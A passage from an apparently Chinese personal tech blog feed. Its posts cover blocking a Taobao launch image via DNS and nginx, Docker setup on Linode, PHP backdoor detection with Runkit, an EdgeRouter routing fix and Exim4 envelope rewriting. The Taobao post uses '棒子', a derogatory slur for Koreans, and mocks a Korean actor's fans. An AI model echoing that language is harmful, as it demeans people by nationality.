<p>使用神器 Charles 分析后可以发现，手机淘宝客户端启动的时候会请求这样一个 URL <code>www.taobao.com/go/rgn/taobao2013/bootimage.php</code>，里面内容就是启动图片的信息咯：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"<span class="attribute">url</span>":<span class="value"><span class="string">"http:\/\/gtms02.alicdn.com\/tps\/i2\/T1Du9PFqtcXXbzlxAc-640-1136.png"</span></span>,"<span class="attribute">smallurl</span>":<span class="value"><span class="string">"http:\/\/gtms01.alicdn.com\/tps\/i1\/T1YceMFBNgXXXz0cAs-640-960.png"</span></span>,"<span class="attribute">starttime</span>":<span class="value"><span class="string">"2014-03-01 16:01:00"</span></span>,"<span class="attribute">endtime</span>":<span class="value"><span class="string">"2014-03-08 23:59:59"</span></span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>⊙﹏⊙b 一号就出来了这个图片我七号才忍无可忍你们看我的耐心是多么好呀~ 忍了差不多有七天呢~</p>
<p>然后大家都知道怎么做了，我家里的网络使用的 DNS 是我用 DNSMasq 自建的，把 <code>www.taobao.com</code> 指向到我本地的 nginx 反向代理即可，反向代理配置如下：</p>
<figure class="highlight nginxconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">server</span> &#123;</span><br><span class="line">	<span class="title">server_name</span> www.taobao.com;</span><br><span class="line"></span><br><span class="line">	<span class="title">location</span> = /go/rgn/taobao2013/bootimage.php &#123;</span><br><span class="line">		<span class="title">return</span> <span class="number">403</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title">location</span> / &#123;</span><br><span class="line">		<span class="title">proxy_pass</span> <span class="url">http://www.taobao.com</span>;</span><br><span class="line">		<span class="title">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后重启手机淘宝客户端，啊，一切都清净了，再也没有讨厌的棒子男人出现了！</p>
<p><strong>最后，我就是觉得李敏镐没有洛阳铲好看你们这群棒子粉不服来咬我啊！</strong></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近手机淘宝多了一个很讨厌的启动图，上面是一个笑的很脑残的人拿着手机的样子，每次早上在被窝里查快递的时候，我都会被丫的脑残笑恶寒的立刻就醒了。（你们看我最近起的这么早不是没有原因的！</p>
<p>然后今天我终于忍不住了。</p>
<p>使用神器 Charles 分析后可以]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[Docker Linode 部署笔记]]></title>
    <link href="https://blog.swan.im/docker-linode-deployment-notes/"/>
    <id>https://blog.swan.im/docker-linode-deployment-notes/</id>
    <published>2014-02-20T02:36:00.000Z</published>
    <updated>2014-06-06T18:03:47.000Z</updated>
    <content type="html"><![CDATA[<p>运行环境为 Ubuntu 12.04 LTS 64bit，Docker 0.8.0。<br>在开始之前，建议部署一个全新的 Linode 来进行操作以防止历史遗留的配置造成意外 :-D</p>
<p>咳咳，以下运行的命令都是以 <strong>root</strong> 身份运行的，我比较懒喜欢直接 <code>sudo -s</code>，不过这不是一个好的习惯各位不要学习啊哈哈~</p>
<ol>
<li><p>更新系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure>
</li>
<li><p>替换内核和 GRUB</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux-virtual grub-legacy-ec2</span><br><span class="line">apt-get install linux-image-generic-lts-raring linux-headers-generic-lts-raring</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑 <code>/boot/grub/menu.lst</code>，找到</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># defoptions=console=hvc0</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>在后面加上 <code>rootflags=nobarrier</code>，注意 <strong>不要</strong> 取消这行的注释<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># defoptions=console=hvc0 rootflags=nobarrier</span></span><br></pre></td></tr></table></figure></p>
<ol>
<li>编辑 <code>/etc/default/grub</code>，找到<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="setting">GRUB_CMDLINE_LINUX=<span class="value"><span class="string">""</span></span></span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>里面加上 <code>cgroup_enable=memory swapaccount=1</code><br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="setting">GRUB_CMDLINE_LINUX=<span class="value"><span class="string">"cgroup_enable=memory swapaccount=1"</span></span></span></span><br></pre></td></tr></table></figure></p>
<ol>
<li><p>重新生成 <code>/boot/grub/menu.lst</code></p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span>-grub-legacy-ec2</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 Linode Profile<br><br>将 <strong>Boot Settings</strong> 里的 <strong>Kernel</strong> 修改为 <code>pv-grub-x86_64</code>，<br>然后取消勾选 <strong>Filesystem/Boot Helpers</strong> 里的 <strong>Xenify Distro</strong>，保存，然后重启。<br>重启之后 <code>uname -r</code> 即可看到当前内核版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@linode-x1:~<span class="comment"># uname -r</span></span><br><span class="line"><span class="number">3.8</span>.<span class="number">0</span>-<span class="number">35</span>-generic</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装 Docker<br><br>嘛，这里说过了就不说了，可以翻阅之前写的 <a href="http://blog.swan.im/posts/178233-docker-concise-deployment-tutorials">Docker 简明部署教程</a> 或者官方文档 <a href="http://docs.docker.io/en/latest/installation/ubuntulinux/" target="_blank" rel="external">Installation on Ubuntu - Docker Documentation</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv-keys <span class="number">36</span>A1D7869245C8950F966E92D8576A8BA88D21E9</span><br><span class="line">sh -c <span class="string">"echo deb http://get.docker.io/ubuntu docker main\</span><br><span class="line">&gt; /etc/apt/sources.list.d/docker.list"</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y lxc-docker</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>装完之后可以 <code>docker info</code> 看一下～是不是很完美呐～<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root<span class="annotation">@linode</span>-<span class="string">x1:</span>~# docker info</span><br><span class="line"><span class="string">Containers:</span> <span class="number">5</span></span><br><span class="line"><span class="string">Images:</span> <span class="number">106</span></span><br><span class="line"><span class="string">Driver:</span> aufs</span><br><span class="line"> Root <span class="string">Dir:</span> <span class="regexp">/var/</span>lib<span class="regexp">/docker/</span>aufs</span><br><span class="line"><span class="label"> Dirs:</span> <span class="number">116</span></span><br></pre></td></tr></table></figure></p>
<p>最后抱怨一下 Markdown 其实没那么好用，幸好还能往里加 HTML :-(<br>以及 AppEx 什么时候支持 3.8 的内核啊魂淡前面加一台 3.2 内核的 Linode 跑它很贵的好吗一个月 20 刀呢！（果然人穷就是尼玛事儿多</p>
<p>参考文章:</p>
<ol>
<li><a href="https://www.linode.com/wiki/index.php/PV-GRUB" target="_blank" rel="external">PV-GRUB - LinodeWiki</a></li>
<li><a href="http://docs.docker.io/en/latest/installation/ubuntulinux/" target="_blank" rel="external">Installation on Ubuntu - Docker Documentation</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>运行环境为 Ubuntu 12.04 LTS 64bit，Docker 0.8.0。<br>在开始之前，建议部署一个全新的 Linode 来进行操作以防止历史遗留的配置造成意外 :-D</p>
<p>咳咳，以下运行的命令都是以 <strong>root</strong> 身]]>
    </summary>
    
      <category term="- ubuntu
- docker
- Linode" scheme="https://blog.swan.im/tags/ubuntu-docker-Linode/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用 Runkit 实现简易的 PHP 后门检测]]></title>
    <link href="https://blog.swan.im/shi-yong-runkit-shi-xian-jian-yi-de-php-hou-men-jian-ce/"/>
    <id>https://blog.swan.im/shi-yong-runkit-shi-xian-jian-yi-de-php-hou-men-jian-ce/</id>
    <published>2014-02-13T19:34:00.000Z</published>
    <updated>2014-06-06T17:06:02.000Z</updated>
    <content type="html"><![CDATA[<p>这是今天在帮某大检查他被黑的机器的时候想出的歪门邪道。<br>原理很简单，就是把 PHP 原有的函数改名，然后用自己的函数替换掉那个原来的函数。</p>
<p>啊，首先呢，你必须要有 root 权限~ 用虚拟主机的同学们请自觉做鸟兽散。</p>
<p>Runkit 在 <a href="http://pecl.php.net/package/runkit" target="_blank" rel="external">PECL</a> 的版本非常老，最新的版本居然是 2006-06-06 年的。<br>当然老没有关系，有些发行版就喜欢用老的东西，以及大部分虚拟主机用户还喜欢用 PHP 5.2 甚至更老的版本呢。不过这个例外，由于版本太老了所以连在 PHP 5.2 上都跑不了，所以我们要去 GitHub 上下最新的开发分支。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zenovich/runkit.git</span><br><span class="line"><span class="built_in">cd</span> runkit</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>然后在 <strong>php.ini</strong> 里加上相关条目：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[runkit]</span><br><span class="line">extension="runkit.so"</span><br><span class="line">runkit.internal_override = On</span><br></pre></td></tr></table></figure></p>
<p>找不到 <strong>php.ini</strong> 在哪儿的，请在 Web 目录下放置如下文件，然后用浏览器打开就能看到咯：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> php_ini_loaded_file();</span><br></pre></td></tr></table></figure></p>
<p>当然呢，对于蛋疼的 DirectAdmin 用户，我们还需要在 <strong>php.ini</strong> 里把 <strong>extension_dir</strong> 修改为 <code>/usr/local/bin/php-config --extension-dir</code> 所显示的目录才行。</p>
<p>然后找个地方放下这个文件，我是放在了 <code>/usr/local/lib/php/security.php</code>，下文也以此为例子。<br>注意的是：</p>
<pre><code>1. 必须去掉这个文件的写权限，不怕死的可以不去掉。
2. 开启了 <span class="keyword">*</span><span class="keyword">*</span>open_basedir<span class="keyword">*</span><span class="keyword">*</span> 选项的，这个文件需要放置在 <span class="keyword">*</span><span class="keyword">*</span>open_basedir<span class="keyword">*</span><span class="keyword">*</span> 里面所列出的目录里，不然会出错。
3. 请把 `/tmp` 换成其他可写的日志目录，或者换成 syslog 什么的。
</code></pre><script src="https://gist.github.com/ym/f00dba163f81873f4619.js"></script>

<p>再修改 <strong>php.ini</strong>，找到 <code>auto_prepend_file</code> 这行，改为：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="setting">auto_prepend_file = <span class="value">/usr/local/lib/php/security.php</span></span></span><br></pre></td></tr></table></figure></p>
<p>最后重启 apache 进程即可看到效果啦~ 日志是介个样子的<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">================</span><br><span class="line">URI 			= /login.php</span><br><span class="line">Client 		= <span class="number">125.33</span>.92.240</span><br><span class="line">Header 		= <span class="string">Location:</span> index.php</span><br><span class="line">Backtrace = <span class="regexp">/home/</span>xxxxxx<span class="regexp">/domains/</span>xxxxxx.net<span class="regexp">/public_html/</span>global.<span class="string">php:</span><span class="number">354</span>:header</span><br><span class="line">            <span class="regexp">/home/</span>xxxxxx<span class="regexp">/domains/</span>xxxxxx.net<span class="regexp">/public_html/</span>login.<span class="string">php:</span><span class="number">45</span>:ObHeader</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这是今天在帮某大检查他被黑的机器的时候想出的歪门邪道。<br>原理很简单，就是把 PHP 原有的函数改名，然后用自己的函数替换掉那个原来的函数。</p>
<p>啊，首先呢，你必须要有 root 权限~ 用虚拟主机的同学们请自觉做鸟兽散。</p>
<p>Runkit 在 <a]]>
    </summary>
    
      <category term="- PHP" scheme="https://blog.swan.im/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Docker 简明部署教程]]></title>
    <link href="https://blog.swan.im/docker-deployment-notes/"/>
    <id>https://blog.swan.im/docker-deployment-notes/</id>
    <published>2014-02-07T14:29:00.000Z</published>
    <updated>2014-06-06T17:06:39.000Z</updated>
    <content type="html"><![CDATA[<p>喵，首先需要准备一个干净的 Ubuntu 12.04 LTS 环境。<br>Tips: 如果使用 VPS 的话推荐使用基于 KVM / VMWare 虚拟化的，如果是 OpenVZ 什么的就算了… 洗洗睡吧</p>
<h2 id="安装_Docker">安装 Docker</h2><p>首先需要升级内核，由于 Precise 默认提供的 3.2 内核里 LXC 的支持有点问题，所以我们需要升级到 3.8：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y linux-image-generic-lts-raring linux-headers-generic-lts-raring</span><br></pre></td></tr></table></figure></p>
<p>升级完成后重启一下，让内核生效：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure></p>
<p>然后导入 Docker 的 Key 并安装之：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys <span class="number">36</span>A1D7869245C8950F966E92D8576A8BA88D21E9</span><br><span class="line">sudo sh -c <span class="string">"echo deb http://get.docker.io/ubuntu docker main\</span><br><span class="line">&gt; /etc/apt/sources.list.d/docker.list"</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y lxc-docker</span><br></pre></td></tr></table></figure></p>
<h2 id="准备基础镜像">准备基础镜像</h2><p>接下来我们需要准备一个基础镜像，对于我等 Debian 脑残粉，嗯下面的基础镜像就以 Debian 7 Wheezy 为例子啦～</p>
<p>当然，你也可以直接用 <code>docker pull debian</code> 从官方 registry 下载，但是 Cloudflare 在国内的可用性实在是太烂了，还是自己做算了。</p>
<p>制作镜像需要用到 <code>debootstrap</code> 这个包，我们先安装一下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y debootstrap</span><br></pre></td></tr></table></figure></p>
<p>然后生成一只 Debian：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debootstrap wheezy debian-wheezy http://mirrors.espresso.li/debian</span><br></pre></td></tr></table></figure></p>
<p>嗯注意请把 <code>http://mirrors.espresso.li/debian</code> 换成你所使用的 Debian 源的地址，上面写的这个源是不对外开放的喵</p>
<p>接下来我们把它导入 Docker：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -C debian-wheezy -c . | sudo docker import - espresso/debian</span><br></pre></td></tr></table></figure></p>
<p>嗯好了接下来你们自己玩儿吧我上班去了。。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>喵，首先需要准备一个干净的 Ubuntu 12.04 LTS 环境。<br>Tips: 如果使用 VPS 的话推荐使用基于 KVM / VMWare 虚拟化的，如果是 OpenVZ 什么的就算了… 洗洗睡吧</p>
<h2 id="安装_Docker">安装 Docker<]]>
    </summary>
    
      <category term="- docker
- ubuntu
- Ubuntu" scheme="https://blog.swan.im/tags/docker-ubuntu-Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[解決 EdgeRouter 雙 WAN 時某一出口無法正常 NAT 的問題]]></title>
    <link href="https://blog.swan.im/jie-jue-edgerouter-shuang-wan-shi-mou-chu-kou-wu-fa-zheng-chang-nat-de-wen-ti/"/>
    <id>https://blog.swan.im/jie-jue-edgerouter-shuang-wan-shi-mou-chu-kou-wu-fa-zheng-chang-nat-de-wen-ti/</id>
    <published>2013-12-13T06:36:00.000Z</published>
    <updated>2014-06-06T17:04:34.000Z</updated>
    <content type="html"><![CDATA[<p>前幾天在路由器上跑 mtr 把 ssh 跑死了，由於沒接 Console 的線我也不知道為什麼所以乾脆重啟了一下。</p>
<p>然後，我聯通出口的 NAT 掛掉了。 :-(</p>
<p>我的網絡架構是這樣子的：</p>
<blockquote>
<p>接入層 EdgeRouter Lite：</p>
<ul>
<li>eth0 接入到室內交換機</li>
<li>eth1 上聯公用 TP-LINK 路由器，使用 DHCP 接入長城寬帶</li>
<li>eth2 上聯聯通 EPON 終端設備，通過 PPPoE 接入聯通寬帶</li>
</ul>
</blockquote>
<p>重啟之後由於 eth1 的 DHCP 先獲取到了 IP 地址，系統的默認路由就變成了 eth1。</p>
<p>於是後來 eth2 上連接的 PPPoE 連接完成後沒有修改默認路由，NAT 自然不知道把數據往哪裡扔了，所以… 解決辦法很簡單咯：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip route replace default via pppoe0</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>前幾天在路由器上跑 mtr 把 ssh 跑死了，由於沒接 Console 的線我也不知道為什麼所以乾脆重啟了一下。</p>
<p>然後，我聯通出口的 NAT 掛掉了。 :-(</p>
<p>我的網絡架構是這樣子的：</p>
<blockquote>
<p>接入層 EdgeR]]>
    </summary>
    
      <category term="- EdgeRouter" scheme="https://blog.swan.im/tags/EdgeRouter/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[搭建 Exim4 來去除 Google Apps 發送郵件時提示以某某的身份發送的問題]]></title>
    <link href="https://blog.swan.im/use-exim4-to/"/>
    <id>https://blog.swan.im/use-exim4-to/</id>
    <published>2013-11-26T10:47:00.000Z</published>
    <updated>2015-02-14T15:40:12.000Z</updated>
    <content type="html"><![CDATA[<p>之前為了防止各個服務商沒事兒洩漏我 E-mail 地址，我每次註冊服務時填寫的註冊郵箱地址都是 <strong>provider-name@xswan.net</strong> 這種形式的，本來這樣沒什麼問題，但是 … 要回覆的時候問題就來了。</p>
<p>首先我們把這個郵箱添加到 <strong>Send mail as</strong> 裡去，然後 … 嗯發郵件的時候，就會出現這樣討厭的提示了：</p>
<p><img src="http://user-image.logdown.io/user/950/blog/939/post/162913/BpNfnWLS0ei6sZypM6sx_06$TKM1B6LFD8R2O~_NXFYY.jpg" alt="06$TKM1B6LFD8R2O~_NXFYY.jpg"></p>
<p>在 Google Apps 的後臺找了半天也沒發現能重寫 Envelope-From 這個頭的地方，那就搭建一個 Exim4 好啦～</p>
<p>這裡我使用的是 <a href="https://www.digitalocean.com/?refcode=6034af1bc1c8" target="_blank" rel="external">DigitalOcean</a> 的 VPS 來搭建 Exim4，主要原因是：</p>
<ol>
<li>可以設置 PTR，郵件服務器不做反向解析的話到達率可是很低的喲</li>
<li>性價比高，5 USD 還 SSD 你到哪兒找去（LowEndBox 什麼的地方除外）</li>
</ol>
<p>操作系統我使用的是 Debian 7 x64，安裝步驟如下：</p>
<p><strong>1.</strong> 安裝 Exim4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get -y upgrade</span><br><span class="line">apt-get -y install mailutils exim4-daemon-light</span><br></pre></td></tr></table></figure></p>
<p><strong>2.</strong> 配置 Exim4<br>把以下內容覆蓋到 <code>/etc/exim4/update-exim4.conf.conf</code> 然後運行 <code>dpkg-reconfigure exim4</code> 一路 Next 即可：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="setting">dc_eximconfig_configtype=<span class="value">'internet'</span></span></span><br><span class="line"><span class="setting">dc_other_hostnames=<span class="value">''</span></span></span><br><span class="line"><span class="setting">dc_local_interfaces=<span class="value">''</span></span></span><br><span class="line"><span class="setting">dc_readhost=<span class="value">''</span></span></span><br><span class="line"><span class="setting">dc_relay_domains=<span class="value">''</span></span></span><br><span class="line"><span class="setting">dc_minimaldns=<span class="value">'<span class="keyword">true</span>'</span></span></span><br><span class="line"><span class="setting">dc_relay_nets=<span class="value">'<span class="number">216.239</span>.<span class="number">32.0</span>/<span class="number">19</span>;<span class="number">64.233</span>.<span class="number">160.0</span>/<span class="number">19</span>;<span class="number">66.249</span>.<span class="number">80.0</span>/<span class="number">20</span>;<span class="number">72.14</span>.<span class="number">192.0</span>/<span class="number">18</span>;<span class="number">209.85</span>.<span class="number">128.0</span>/<span class="number">17</span>;<span class="number">66.102</span>.<span class="number">0.0</span>/<span class="number">20</span>;<span class="number">74.125</span>.<span class="number">0.0</span>/<span class="number">16</span>;<span class="number">64.18</span>.<span class="number">0.0</span>/<span class="number">20</span>;<span class="number">207.126</span>.<span class="number">144.0</span>/<span class="number">20</span>;<span class="number">173.194</span>.<span class="number">0.0</span>/<span class="number">16</span>'</span></span></span><br><span class="line"><span class="setting">dc_smarthost=<span class="value">''</span></span></span><br><span class="line"><span class="setting">CFILEMODE=<span class="value">'<span class="number">644</span>'</span></span></span><br><span class="line"><span class="setting">dc_use_split_config=<span class="value">'<span class="keyword">true</span>'</span></span></span><br><span class="line"><span class="setting">dc_hide_mailname=<span class="value">''</span></span></span><br><span class="line"><span class="setting">dc_mailname_in_oh=<span class="value">'<span class="keyword">true</span>'</span></span></span><br><span class="line"><span class="setting">dc_localdelivery=<span class="value">'mail_spool'</span></span></span><br></pre></td></tr></table></figure></p>
<p>上面的 <strong>dc_relay_nets</strong> 裡是 Google 的 IP 段，獲取方法在 <a href="https://support.google.com/a/answer/60764?hl=en" target="_blank" rel="external">這裡</a>。</p>
<p><strong>3.</strong> 配置 Exim4 重寫規則<br>將以下內容寫入 <code>/etc/exim4/conf.d/rewrite/32\_exim4-rewrite-envelope-from</code>：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a@loli<span class="class">.vg</span> <span class="variable">$h_from</span> F</span><br></pre></td></tr></table></figure></p>
<p><code>a@loli.vg</code> 是我的郵箱地址，實際操作中請按換成自己的嗯。。</p>
<p>修改完成後重啟 exim4:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-rc.d exim4 restart</span><br></pre></td></tr></table></figure></p>
<p><strong>4.</strong> 安全加固<br>其實就是用 iptables 把來自非 Google 的 IP 屏蔽掉而已，雖然第二步的 <strong>dc_relay_nets</strong> 已經處理了，但是我覺得拒絕投遞的日誌出現也很煩，那就在 iptables 裡再屏蔽一次好了 :-)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">216.239</span>.<span class="number">32.0</span>/<span class="number">19</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">64.233</span>.<span class="number">160.0</span>/<span class="number">19</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">66.249</span>.<span class="number">80.0</span>/<span class="number">20</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">72.14</span>.<span class="number">192.0</span>/<span class="number">18</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">209.85</span>.<span class="number">128.0</span>/<span class="number">17</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">66.249</span>.<span class="number">80.0</span>/<span class="number">20</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">66.102</span>.<span class="number">0.0</span>/<span class="number">20</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">74.125</span>.<span class="number">0.0</span>/<span class="number">16</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">66.249</span>.<span class="number">80.0</span>/<span class="number">20</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">207.126</span>.<span class="number">144.0</span>/<span class="number">20</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT <span class="operator">-s</span> <span class="number">173.194</span>.<span class="number">0.0</span>/<span class="number">16</span> -p tcp -m tcp --dport <span class="number">25</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -m tcp --dport <span class="number">25</span> -j DROP</span><br></pre></td></tr></table></figure></p>
<p><strong>5.</strong> 修改域名 A 記錄和 SPF 記錄<br>首先添加一條 <strong>_spf.moease.org</strong>，記錄類型為 SPF（沒有 SPF 的選 TXT)：<br><code>&quot;v=spf1 a:mx1.moease.org ip4:198.211.101.101 ?all&quot;</code></p>
<p>這裡的 <strong>mx1.moease.org</strong> 就是我運行 Exim4 的機器的 Hostname，<em>198.211.101.101</em> 是它的 IP 地址。</p>
<p>然後將 <strong>moease.org</strong> 的 SPF 記錄修改為：<br><code>&quot;v=spf1 include:_spf.moease.org include:_spf.google.com -all&quot;</code></p>
<p>關於 SPF 記錄的更多知識可以在<a href="https://wzyboy.im/post/865.html" target="_blank" rel="external">小允的 Blog</a> 裡找到，這裡就不再敘述了。</p>
<p><strong>6.</strong> 修改 Google Apps 郵件發送設置<br>打開 Google Apps 控制面板，依次打開：<br>Google Apps &gt; Gmail &gt; Advanced Settings</p>
<p>在打開的頁面裡找到 Outbound gateway，填上郵件服務器的地址保存即可，我這裡填寫的是 <code>mx1.moease.org</code>。<br>（沒有的請先升級到付費版本）</p>
<p>好啦，完結撒花～</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>之前為了防止各個服務商沒事兒洩漏我 E-mail 地址，我每次註冊服務時填寫的註冊郵箱地址都是 <strong>provider-name@xswan.net</strong> 這種形式的，本來這樣沒什麼問題，但是 … 要回覆的時候問題就來了。</p>
<p>首先我們把這個]]>
    </summary>
    
      <category term="- debian
- Google Apps
- Exim
- Gmail
- Debian" scheme="https://blog.swan.im/tags/debian-Google-Apps-Exim-Gmail-Debian/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CSS 实现图片等比缩放]]></title>
    <link href="https://blog.swan.im/css-image-scale/"/>
    <id>https://blog.swan.im/css-image-scale/</id>
    <published>2013-09-02T07:09:00.000Z</published>
    <updated>2014-06-06T17:09:38.000Z</updated>
    <content type="html"><![CDATA[<p>嗯因为客户的站点编辑内容的时候上传的图片部分没有缩放，所以得在 CSS 上处理一下。</p>
<p>直接上代码咯。</p>
